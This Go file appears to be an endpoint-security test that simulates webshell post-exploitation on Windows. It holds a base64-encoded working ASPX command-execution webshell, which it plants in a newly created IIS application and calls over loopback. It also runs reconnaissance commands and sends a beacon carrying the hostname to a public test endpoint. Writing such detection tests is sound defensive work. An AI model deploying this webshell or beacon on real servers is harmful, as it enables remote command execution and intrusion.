//go:build windows
// +build windows

/*
ID: c5f1d6e9-4a0b-1f8c-5d2e-9b0c1d2e3f09
NAME: Webshell Post-Exploitation Simulation
TECHNIQUES: T1190, T1059.003
TACTICS: initial-access, execution
SEVERITY: high
TARGET: windows-endpoint
COMPLEXITY: medium
THREAT_ACTOR: N/A
SUBCATEGORY: initial-access
TAGS: webshell, cmd-execution, exploit-public-facing, post-exploitation
SOURCE_URL: https://top-attack-techniques.mitre-engenuity.org/
UNIT: response
CREATED: 2026-01-11
AUTHOR: sectest-builder
*/
package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/google/uuid"
	Endpoint "github.com/preludeorg/libraries/go/tests/endpoint"
)

const (
	TEST_UUID  = "c5f1d6e9-4a0b-1f8c-5d2e-9b0c1d2e3f09"
	TEST_NAME  = "Webshell Post-Exploitation Simulation"
	TARGET_DIR = "c:\\F0"

	// ExitTestError is the framework test-error exit code. The vendored prelude
	// endpoint lib maps UnexpectedTestError to exit 1 — do not use it (CLAUDE.md).
	ExitTestError = 999
)

// isAdminContext gates denial classification (Bug Prevention Rule 8).
var isAdminContext = false

// probeAdminContext checks whether the current context is elevated.
func probeAdminContext() bool {
	return exec.Command("net", "session").Run() == nil
}

// fileExists is a small os.Stat wrapper
func fileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}

// isPositiveProtectionEvidence returns true ONLY for exact OS/policy denial
// markers (generic words, PATH errors and localized variants are NOT evidence).
func isPositiveProtectionEvidence(s string) bool {
	return strings.Contains(s, "Access is denied") ||
		strings.Contains(s, "This program is blocked by group policy") ||
		strings.Contains(s, "Operation did not complete successfully because the file contains a virus")
}

// C2 test endpoint - harmless public service for connectivity verification
const C2_ENDPOINT = "https://httpbin.org/post"

// ReconCommand represents a reconnaissance command typical of webshell activity
type ReconCommand struct {
	Name        string
	Command     string
	Args        []string
	Description string
}

// Define reconnaissance commands typically executed via webshells
var reconCommands = []ReconCommand{
	{
		Name:        "whoami",
		Command:     "whoami",
		Args:        []string{"/all"},
		Description: "User context enumeration - identifies privileges and group memberships",
	},
	{
		Name:        "hostname",
		Command:     "hostname",
		Args:        []string{},
		Description: "System identification - reveals machine name for lateral movement planning",
	},
	{
		Name:        "ipconfig",
		Command:     "ipconfig",
		Args:        []string{"/all"},
		Description: "Network configuration - identifies IP addresses, DNS, DHCP for network mapping",
	},
	{
		Name:        "systeminfo",
		Command:     "systeminfo",
		Args:        []string{},
		Description: "Full system information - OS version, hotfixes, domain membership",
	},
	{
		Name:        "netstat",
		Command:     "netstat",
		Args:        []string{"-an"},
		Description: "Network connections - active connections and listening ports",
	},
	{
		Name:        "tasklist",
		Command:     "tasklist",
		Args:        []string{},
		Description: "Running processes - identify security software and interesting processes",
	},
}

// webshellAspxB64 is a minimal textbook ASPX command-execution webshell,
// base64-stored so the repo never carries a directly-usable webshell file
// (decoded and written to the lab webroot only at runtime, deleted at cleanup).
// Bit source: textbook Process.Start(cmd /c ?c=) executor — the exact shape
// webshell detections key on (aspx drop + w3wp.exe spawning cmd.exe).
const webshellAspxB64 = "PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPgo8JUAgSW1wb3J0IE5hbWVzcGFjZT0iU3lzdGVtLkRpYWdub3N0aWNzIiAlPgo8JQogICAgc3RyaW5nIGMgPSBSZXF1ZXN0LlF1ZXJ5U3RyaW5nWyJjIl07CiAgICBpZiAoIXN0cmluZy5Jc051bGxPckVtcHR5KGMpKSB7CiAgICAgICAgdmFyIHAgPSBuZXcgUHJvY2Vzc1N0YXJ0SW5mbygiY21kLmV4ZSIsICIvYyAiICsgYyk7CiAgICAgICAgcC5SZWRpcmVjdFN0YW5kYXJkT3V0cHV0ID0gdHJ1ZTsgcC5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKICAgICAgICB2YXIgcHJvYyA9IFByb2Nlc3MuU3RhcnQocCk7CiAgICAgICAgUmVzcG9uc2UuV3JpdGUoIjxwcmU+IiArIHByb2MuU3RhbmRhcmRPdXRwdXQuUmVhZFRvRW5kKCkgKyAiPC9wcmU+Iik7CiAgICB9CiU+Cg==" 

// WEBROOT under ARTIFACT_DIR (non-whitelisted; all writes stay inside it)
const WEBROOT_DIR = "c:\\Users\\fortika-test\\webroot"
const WEBAPP_NAME = "F0"

// webAppCreated tracks IIS app creation for cleanup
var webAppCreated bool

// runPowerShell runs a PowerShell command with MultiWriter capture; returns output+err
func runPowerShell(psCmd string) (string, error) {
	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
	var buf bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &buf)
	cmd.Stderr = io.MultiWriter(os.Stderr, &buf)
	err := cmd.Run()
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}
	exitCode := 0
	if err != nil && cmd.ProcessState != nil {
		exitCode = cmd.ProcessState.ExitCode()
	}
	LogProcessExecution("powershell.exe", "powershell -Command <webapp mgmt>", pid, err == nil, exitCode, "IIS web-app management")
	return buf.String(), err
}

// CommandResult stores the result of a reconnaissance command
type CommandResult struct {
	Command  string
	Success  bool
	Blocked  bool
	Output   string
	Error    string
	Duration time.Duration
	ExitCode int
}

// executeReconCommand executes a single reconnaissance command and captures result
func executeReconCommand(rc ReconCommand) CommandResult {
	result := CommandResult{
		Command: rc.Name,
	}

	startTime := time.Now()

	var cmd *exec.Cmd
	if len(rc.Args) > 0 {
		cmd = exec.Command(rc.Command, rc.Args...)
	} else {
		cmd = exec.Command(rc.Command)
	}

	// Tee output to console AND buffer; persist per-command output file
	var outputBuffer bytes.Buffer
	cmd.Stdout = io.MultiWriter(os.Stdout, &outputBuffer)
	cmd.Stderr = io.MultiWriter(os.Stderr, &outputBuffer)

	err := cmd.Run()
	result.Duration = time.Since(startTime)
	result.Output = outputBuffer.String()

	pid := 0
	exitCode := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	if len(result.Output) > 0 {
		outputPath := filepath.Join(TARGET_DIR, fmt.Sprintf("%s_output.txt", rc.Name))
		os.WriteFile(outputPath, []byte(result.Output), 0644)
	}

	cmdLine := strings.Join(append([]string{rc.Command}, rc.Args...), " ")

	if err != nil {
		result.Error = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}

		// Block ONLY on exact OS denial, admin-gated (Rule 8). "not recognized"
		// is a PATH/missing-binary environment error — benign.
		if isAdminContext && (isPositiveProtectionEvidence(result.Output) || isPositiveProtectionEvidence(result.Error)) {
			result.Blocked = true
			result.ExitCode = 126
			LogProcessExecution(rc.Command, cmdLine, pid, false, 126, "Blocked by security controls (OS denial)")
		} else {
			result.ExitCode = exitCode
			LogProcessExecution(rc.Command, cmdLine, pid, false, exitCode, err.Error())
		}
		return result
	}

	// Command succeeded
	result.Success = true
	result.ExitCode = 0
	LogProcessExecution(rc.Command, cmdLine, pid, true, 0, "")

	return result
}

// performC2Callback simulates a C2 callback that a webshell might perform
// Uses httpbin.org as a safe test endpoint
func performC2Callback(data string) (bool, bool, string) {
	Endpoint.Say("  Simulating C2 callback to %s", C2_ENDPOINT)

	// Create POST request with simulated beacon data
	payload := strings.NewReader(fmt.Sprintf("beacon=%s&host=%s", data, os.Getenv("COMPUTERNAME")))

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	req, err := http.NewRequest("POST", C2_ENDPOINT, payload)
	if err != nil {
		return false, false, fmt.Sprintf("Failed to create request: %v", err)
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	startTime := time.Now()
	resp, err := client.Do(req)
	duration := time.Since(startTime)

	if err != nil {
		// Network errors (DNS failure, refused connections, timeouts) are
		// environmental conditions, NOT endpoint protection evidence (Rule 8).
		errorStr := err.Error()
		LogMessage("WARN", "C2 Callback", fmt.Sprintf("C2 callback network failure (benign, not protection evidence): %s (%v)", errorStr, duration))
		return false, false, fmt.Sprintf("Network error: %v", err)
	}
	defer resp.Body.Close()

	// Read response
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		LogMessage("INFO", "C2 Callback", fmt.Sprintf("C2 callback successful: HTTP %d (%v)", resp.StatusCode, duration))
		return true, false, fmt.Sprintf("HTTP %d - %d bytes received", resp.StatusCode, len(body))
	}

	// Non-success status codes are the REMOTE service's response (httpbin),
	// not endpoint protection — never classified as blocked (Rule 8).
	if resp.StatusCode == 403 || resp.StatusCode == 451 {
		LogMessage("WARN", "C2 Callback", fmt.Sprintf("Remote endpoint returned HTTP %d (remote-service response, not endpoint protection)", resp.StatusCode))
	}
	return false, false, fmt.Sprintf("HTTP %d", resp.StatusCode)
}

// executeWebshellPhase drops a runtime-generated ASPX webshell into an IIS web
// application rooted at WEBROOT_DIR (inside ARTIFACT_DIR — no writes outside
// it) and invokes it over LOOPBACK, producing the defining webshell lineage:
// w3wp.exe spawning cmd.exe. The ASPX payload is decoded from base64 at
// runtime and deleted at cleanup; the repo never carries a usable webshell.
// Returns: success, blocked, msg
func executeWebshellPhase() (bool, bool, string) {
	Endpoint.Say("  Webshell phase: IIS drop + loopback invocation (w3wp.exe lineage)")

	// Prerequisite: W3SVC running
	out, err := runPowerShell("(Get-Service W3SVC).Status")
	if err != nil || !strings.Contains(out, "Running") {
		LogMessage("WARN", "Webshell", "IIS (W3SVC) not running — skipping webshell phase (prerequisite)")
		return false, false, "IIS not available — skipped"
	}

	// Create webroot + web application rooted in ARTIFACT_DIR
	if err := os.MkdirAll(WEBROOT_DIR, 0755); err != nil {
		return false, false, fmt.Sprintf("webroot mkdir failed: %v", err)
	}
	if _, err := runPowerShell(fmt.Sprintf(
		"Import-Module WebAdministration; New-WebApplication -Name '%s' -Site 'Default Web Site' -PhysicalPath '%s' -Force", WEBAPP_NAME, WEBROOT_DIR)); err != nil {
		LogMessage("WARN", "Webshell", fmt.Sprintf("New-WebApplication failed (benign skip): %v", err))
		return false, false, fmt.Sprintf("web app creation failed: %v", err)
	}
	webAppCreated = true
	LogMessage("INFO", "Webshell", fmt.Sprintf("Created IIS web application /%s -> %s", WEBAPP_NAME, WEBROOT_DIR))

	// Drop the runtime-decoded ASPX webshell
	aspx, err := base64.StdEncoding.DecodeString(webshellAspxB64)
	if err != nil || len(aspx) < 50 {
		return false, false, "webshell decode failed (internal)"
	}
	shellName := fmt.Sprintf("svc-%d.aspx", time.Now().Unix())
	shellPath := filepath.Join(WEBROOT_DIR, shellName)
	if err := os.WriteFile(shellPath, aspx, 0644); err != nil {
		if strings.Contains(err.Error(), "Access is denied") {
			return false, true, "webshell write denied (OS denial)"
		}
		return false, false, fmt.Sprintf("webshell write failed: %v", err)
	}
	LogFileDropped(shellName, shellPath, int64(len(aspx)), false)
	LogMessage("INFO", "Webshell", fmt.Sprintf("Dropped runtime-generated ASPX webshell: %s (%d bytes)", shellPath, len(aspx)))

	// Quarantine check: EDRs often delete dropped webshells
	Endpoint.Wait(3)
	if !fileExists(shellPath) {
		LogFileDropped(shellName, shellPath, int64(len(aspx)), true)
		LogMessage("INFO", "Webshell", "Webshell file disappeared (os.Stat-confirmed quarantine)")
		return false, true, "webshell quarantined on drop"
	}

	// Invoke over LOOPBACK — this is the lineage signal: w3wp.exe -> cmd.exe
	url := fmt.Sprintf("http://localhost/%s/%s?c=whoami", WEBAPP_NAME, shellName)
	client := &http.Client{Timeout: 30 * time.Second}
	startTime := time.Now()
	resp, err := client.Get(url)
	duration := time.Since(startTime)
	if err != nil {
		// Web-server errors are environmental, not endpoint protection (Rule 8)
		LogMessage("WARN", "Webshell", fmt.Sprintf("Loopback invocation failed (benign): %v (%v)", err, duration))
		return false, false, fmt.Sprintf("invocation failed: %v", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	if resp.StatusCode == 403 || resp.StatusCode == 404 {
		// Remote-service response (IIS request filtering), not endpoint protection
		LogMessage("WARN", "Webshell", fmt.Sprintf("IIS returned HTTP %d for the webshell (server-side filtering; logged, not counted)", resp.StatusCode))
		return false, false, fmt.Sprintf("IIS HTTP %d", resp.StatusCode)
	}

	// Success = the webshell executed whoami under w3wp.exe (output looks like
	// "computer\user" wrapped in <pre>)
	if strings.Contains(bodyStr, "<pre>") && strings.Contains(bodyStr, `\`) {
		LogMessage("INFO", "Webshell", fmt.Sprintf("Webshell executed under w3wp.exe lineage (HTTP %d, %d bytes, %v)", resp.StatusCode, len(body), duration))
		return true, false, "webshell executed via IIS (w3wp.exe -> cmd.exe)"
	}

	LogMessage("WARN", "Webshell", fmt.Sprintf("Webshell responded HTTP %d but output not recognized (%d bytes)", resp.StatusCode, len(body)))
	return false, false, "webshell response unrecognized"
}

// writeReconOutput saves all reconnaissance output to a marker file
func writeReconOutput(results []CommandResult) error {
	outputPath := filepath.Join(TARGET_DIR, "webshell_recon_output.txt")

	var content strings.Builder
	content.WriteString("=== Webshell Post-Exploitation Reconnaissance Output ===\n")
	content.WriteString(fmt.Sprintf("Timestamp: %s\n", time.Now().Format("2006-01-02 15:04:05")))
	content.WriteString(fmt.Sprintf("Test UUID: %s\n", TEST_UUID))
	content.WriteString("\n")

	for _, result := range results {
		content.WriteString(fmt.Sprintf("--- %s ---\n", result.Command))
		content.WriteString(fmt.Sprintf("Success: %v | Blocked: %v | Duration: %v\n", result.Success, result.Blocked, result.Duration))
		if result.Error != "" {
			content.WriteString(fmt.Sprintf("Error: %s\n", result.Error))
		}
		if result.Output != "" {
			content.WriteString("Output:\n")
			// Truncate very long output
			output := result.Output
			if len(output) > 2000 {
				output = output[:2000] + "\n... (truncated)"
			}
			content.WriteString(output)
		}
		content.WriteString("\n\n")
	}

	outputBytes := []byte(content.String())
	err := os.WriteFile(outputPath, outputBytes, 0644)
	if err != nil {
		return err
	}

	LogFileDropped("webshell_recon_output.txt", outputPath, int64(len(outputBytes)), false)
	return nil
}

// cleanup removes test artifacts
func cleanup() {
	Endpoint.Say("Cleaning up test artifacts...")

	files := []string{
		"webshell_recon_output.txt",
		"test_summary.txt",
		"whoami_output.txt",
		"hostname_output.txt",
		"ipconfig_output.txt",
		"systeminfo_output.txt",
		"netstat_output.txt",
		"tasklist_output.txt",
	}

	for _, file := range files {
		path := filepath.Join(TARGET_DIR, file)
		if err := os.Remove(path); err == nil {
			LogMessage("INFO", "Cleanup", fmt.Sprintf("Removed: %s", file))
		}
	}

	// Remove the IIS web application, any dropped webshells, and the webroot
	if webAppCreated {
		runPowerShell(fmt.Sprintf("Import-Module WebAdministration; Remove-WebApplication -Name '%s' -Site 'Default Web Site'", WEBAPP_NAME))
		webAppCreated = false
		LogMessage("INFO", "Cleanup", "Removed IIS web application /"+WEBAPP_NAME)
	}
	os.RemoveAll(WEBROOT_DIR)
	LogMessage("INFO", "Cleanup", "Removed webroot "+WEBROOT_DIR)
}

func test() {
	// Ensure log is saved on exit
	defer func() {
		if r := recover(); r != nil {
			if globalLog != nil {
				LogMessage("CRITICAL", "Runtime", fmt.Sprintf("Panic recovered: %v", r))
				SaveLog(ExitTestError, fmt.Sprintf("Panic: %v", r))
			}
			cleanup()
			Endpoint.Stop(ExitTestError)
		}
	}()

	// Track results
	var commandResults []CommandResult
	blockedCount := 0
	successCount := 0
	c2Success := false
	c2Blocked := false

	// Phase 1: Initialization
	LogPhaseStart(1, "Initialization")
	Endpoint.Say("Phase 1: Initializing test environment")

	// NOTE: Endpoint.Dropper call removed — it dropped an unused binary into CWD
	// on every run and was never executed (audit 2026-11-03).

	// Create target directory
	if err := os.MkdirAll(TARGET_DIR, 0755); err != nil {
		LogPhaseError(0, fmt.Sprintf("Failed to create target directory: %v", err))
		LogPhaseEnd(0, "failed", "Failed to create target directory")
		SaveLog(ExitTestError, "Failed to create target directory")
		Endpoint.Stop(ExitTestError)
	}

	// Probe privilege context once — gates denial classification (Rule 8)
	isAdminContext = probeAdminContext()
	if isAdminContext {
		LogMessage("INFO", "Initialization", "Running elevated (administrator)")
	} else {
		LogMessage("WARN", "Initialization", "Running NON-elevated — access-denied outcomes will be treated as benign environment results")
	}

	LogMessage("INFO", "Initialization", "Test environment ready")
	LogPhaseEnd(0, "success", "Environment initialized")

	// Phase 2: Execute Reconnaissance Commands
	LogPhaseStart(2, "Reconnaissance Commands")
	Endpoint.Say("\nPhase 2: Executing webshell reconnaissance commands")
	Endpoint.Say("This simulates commands a webshell would run after initial compromise")
	Endpoint.Say("")

	for i, rc := range reconCommands {
		Endpoint.Say("  [%d/%d] Running: %s %s", i+1, len(reconCommands), rc.Command, strings.Join(rc.Args, " "))
		Endpoint.Say("        Purpose: %s", rc.Description)

		result := executeReconCommand(rc)
		commandResults = append(commandResults, result)

		if result.Blocked {
			Endpoint.Say("        [BLOCKED] Command execution was prevented")
			blockedCount++
		} else if result.Success {
			Endpoint.Say("        [EXECUTED] Command completed successfully")
			successCount++
		} else {
			Endpoint.Say("        [FAILED] Command failed: %s", result.Error)
		}

		// Small delay between commands to simulate realistic webshell behavior
		Endpoint.Wait(1)
	}

	if blockedCount > 0 {
		LogPhaseEnd(1, "blocked", fmt.Sprintf("%d/%d commands blocked by security controls", blockedCount, len(reconCommands)))
	} else if successCount == len(reconCommands) {
		LogPhaseEnd(1, "success", fmt.Sprintf("All %d reconnaissance commands executed", len(reconCommands)))
	} else {
		LogPhaseEnd(1, "partial", fmt.Sprintf("%d/%d commands succeeded", successCount, len(reconCommands)))
	}

	// Phase 2b: Webshell Execution via IIS (w3wp.exe lineage)
	LogPhaseStart(3, "Webshell Execution via IIS")
	Endpoint.Say("\nPhase 2b: Webshell drop + loopback invocation (IIS)")

	wsSuccess, wsBlocked, wsMsg := executeWebshellPhase()
	if wsBlocked {
		Endpoint.Say("  [BLOCKED] Webshell phase blocked (positive evidence)")
		blockedCount++
		LogPhaseEnd(2, "blocked", wsMsg)
	} else if wsSuccess {
		Endpoint.Say("  [VULNERABLE] Webshell executed via IIS (w3wp.exe -> cmd.exe lineage)")
		successCount++
		LogPhaseEnd(2, "success", wsMsg)
	} else {
		Endpoint.Say("  [INFO] Webshell phase skipped/inconclusive: %s", wsMsg)
		LogPhaseEnd(2, "skipped", wsMsg)
	}

	// Phase 3: C2 Callback Simulation
	LogPhaseStart(4, "C2 Callback Simulation")
	Endpoint.Say("\nPhase 3: Simulating C2 callback (webshell beacon)")
	Endpoint.Say("  Target: %s (harmless test endpoint)", C2_ENDPOINT)

	// Build beacon data from recon results
	hostname := os.Getenv("COMPUTERNAME")
	if hostname == "" {
		hostname = "unknown"
	}
	beaconData := fmt.Sprintf("F0RT1KA-Webshell-Test|%s|%s", TEST_UUID, hostname)

	var c2Error string
	c2Success, c2Blocked, c2Error = performC2Callback(beaconData)

	if c2Blocked {
		Endpoint.Say("  [BLOCKED] C2 callback was blocked by network security")
		LogPhaseEnd(3, "blocked", "C2 callback blocked by network security")
	} else if c2Success {
		Endpoint.Say("  [VULNERABLE] C2 callback completed successfully")
		LogPhaseEnd(3, "success", "C2 callback succeeded - outbound connection allowed")
	} else {
		// Network unavailable - not necessarily protected, could be environmental
		Endpoint.Say("  [ERROR] C2 callback failed: %s", c2Error)
		LogPhaseEnd(3, "failed", fmt.Sprintf("C2 callback failed: %s", c2Error))
	}

	// Phase 4: Write Output and Assessment
	LogPhaseStart(4, "Output and Assessment")
	Endpoint.Say("\nPhase 4: Writing output and final assessment")

	// Save reconnaissance output
	if err := writeReconOutput(commandResults); err != nil {
		LogMessage("WARN", "Output", fmt.Sprintf("Failed to write recon output: %v", err))
	} else {
		Endpoint.Say("  Reconnaissance output saved to: %s\\webshell_recon_output.txt", TARGET_DIR)
	}

	// Write summary
	summaryPath := filepath.Join(TARGET_DIR, "test_summary.txt")
	summary := fmt.Sprintf(`Webshell Post-Exploitation Simulation Summary
=============================================
Test ID: %s
Timestamp: %s

MITRE ATT&CK Techniques:
- T1190: Exploit Public-Facing Application (post-exploitation)
- T1059.003: Windows Command Shell

Reconnaissance Commands:
  Total: %d
  Executed Successfully: %d
  Blocked: %d

C2 Callback:
  Endpoint: %s
  Success: %v
  Blocked: %v

Assessment:
%s
`,
		TEST_UUID,
		time.Now().Format("2006-01-02 15:04:05"),
		len(reconCommands),
		successCount,
		blockedCount,
		C2_ENDPOINT,
		c2Success,
		c2Blocked,
		generateAssessment(blockedCount, successCount, c2Success, c2Blocked))

	os.WriteFile(summaryPath, []byte(summary), 0644)
	LogFileDropped("test_summary.txt", summaryPath, int64(len(summary)), false)

	LogPhaseEnd(3, "success", "Assessment complete")

	// Final Results
	Endpoint.Say("\n========================================")
	Endpoint.Say("TEST RESULTS SUMMARY")
	Endpoint.Say("========================================")
	Endpoint.Say("Reconnaissance Commands:")
	Endpoint.Say("  - Executed: %d/%d", successCount, len(reconCommands))
	Endpoint.Say("  - Blocked: %d/%d", blockedCount, len(reconCommands))
	Endpoint.Say("C2 Callback:")
	Endpoint.Say("  - Success: %v", c2Success)
	Endpoint.Say("  - Blocked: %v", c2Blocked)

	// Determine exit code based on protection status
	// Protected if: any recon commands blocked OR C2 callback blocked
	if blockedCount > 0 || c2Blocked {
		protectionDetails := []string{}
		if blockedCount > 0 {
			protectionDetails = append(protectionDetails, fmt.Sprintf("%d recon commands blocked", blockedCount))
		}
		if c2Blocked {
			protectionDetails = append(protectionDetails, "C2 callback blocked")
		}

		Endpoint.Say("\n[RESULT] PROTECTED - Security controls detected webshell activity")
		LogMessage("INFO", "Final Assessment", fmt.Sprintf("System PROTECTED: %s", strings.Join(protectionDetails, ", ")))
		SaveLog(Endpoint.ExecutionPrevented, fmt.Sprintf("Protected: %s", strings.Join(protectionDetails, ", ")))
		cleanup()
		Endpoint.Stop(Endpoint.ExecutionPrevented) // Exit 126
	} else if !c2Success && successCount < len(reconCommands) {
		// C2 failed but not blocked, some commands failed - network issue
		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Network issues prevented full test")
		LogMessage("WARN", "Final Assessment", "Test inconclusive due to network/environmental issues")
		SaveLog(ExitTestError, "Network unavailable for C2 callback")
		cleanup()
		Endpoint.Stop(ExitTestError) // Exit 999 - network unavailable
	} else if successCount > 0 || c2Success {
		// Some or all commands succeeded and C2 worked - unprotected
		Endpoint.Say("\n[RESULT] UNPROTECTED - Webshell reconnaissance and C2 activity succeeded")
		LogMessage("CRITICAL", "Final Assessment", "System UNPROTECTED - webshell activity not detected")
		SaveLog(Endpoint.Unprotected, fmt.Sprintf("Unprotected: %d commands executed, C2 callback %v", successCount, c2Success))
		cleanup()
		Endpoint.Stop(Endpoint.Unprotected) // Exit 101
	} else {
		// Edge case
		Endpoint.Say("\n[RESULT] INCONCLUSIVE - Unable to determine protection status")
		LogMessage("WARN", "Final Assessment", "Test inconclusive")
		SaveLog(ExitTestError, "Test inconclusive")
		cleanup()
		Endpoint.Stop(ExitTestError)
	}
}

// generateAssessment creates an assessment string based on results
func generateAssessment(blocked, successful int, c2Success, c2Blocked bool) string {
	if blocked > 0 && c2Blocked {
		return "PROTECTED - Both reconnaissance commands and C2 callbacks were blocked.\n" +
			"Security controls effectively detected webshell-like activity."
	} else if blocked > 0 || c2Blocked {
		return "PARTIAL PROTECTION - Some webshell activity was blocked.\n" +
			"Review security configuration for comprehensive coverage."
	} else if successful > 0 && c2Success {
		return "UNPROTECTED - All reconnaissance commands executed and C2 callback succeeded.\n" +
			"Webshell activity would not be detected by current security controls."
	} else if successful > 0 {
		return "PARTIALLY UNPROTECTED - Reconnaissance commands executed.\n" +
			"C2 callback may have been blocked by network controls."
	}
	return "INCONCLUSIVE - Unable to determine protection status."
}

func main() {
	Endpoint.Say("Starting test at: %s", time.Now().Format("2006-01-02T15:04:05"))
	Endpoint.Say("Test: %s", TEST_NAME)
	Endpoint.Say("UUID: %s", TEST_UUID)
	Endpoint.Say("MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1059.003 (Windows Command Shell)")
	Endpoint.Say("")
	Endpoint.Say("This test simulates POST-EXPLOITATION behavior after webshell deployment.")
	Endpoint.Say("It runs reconnaissance commands and attempts a C2 callback.")
	Endpoint.Say("")

	// Initialize Schema v2.0 compliant logger
	metadata := TestMetadata{
		Version:       "1.0.0",
		Category:      "initial_access",
		Severity:      "high",
		Techniques:    []string{"T1190", "T1059.003"},
		Tactics:       []string{"initial-access", "execution"},
		Score:         7.7, // v2.1 — lab-verified 2026-11-03 on the win lab (Sophos Intercept X). See info.md v2.1 scorecard.
		RubricVersion: "v2.1",
		// ScoreBreakdown intentionally nil under v2.1 — the v1 dimensions in
		// the struct do not match the v2.1 tiered structure. The v2.1 breakdown
		// lives in the info.md scorecard table.
		Tags: []string{"webshell", "post-exploitation", "reconnaissance", "c2", "native"},
	}

	// Resolve organization from registry
	orgInfo := ResolveOrganization("")

	executionContext := ExecutionContext{
		ExecutionID:    uuid.New().String(),
		Organization:   orgInfo.UUID,
		Environment:    "lab",
		DeploymentType: "manual",
		Configuration: &ExecutionConfiguration{
			TimeoutMs:         180000, // 3 minutes for network operations
			CertificateMode:   "not-required",
			MultiStageEnabled: false,
		},
	}

	InitLogger(TEST_UUID, TEST_NAME, metadata, executionContext)

	// Run test with timeout
	done := make(chan bool, 1)
	go func() {
		test()
		done <- true
	}()

	timeout := 3 * time.Minute // Extended for network operations

	select {
	case <-done:
		Endpoint.Say("Test completed")
	case <-time.After(timeout):
		Endpoint.Say("Test timed out after %v", timeout)
		if globalLog != nil {
			LogMessage("ERROR", "Timeout", fmt.Sprintf("Test exceeded timeout of %v", timeout))
			SaveLog(Endpoint.TimeoutExceeded, fmt.Sprintf("Test exceeded timeout of %v", timeout))
		}
		cleanup()
		Endpoint.Stop(Endpoint.TimeoutExceeded)
	}
}
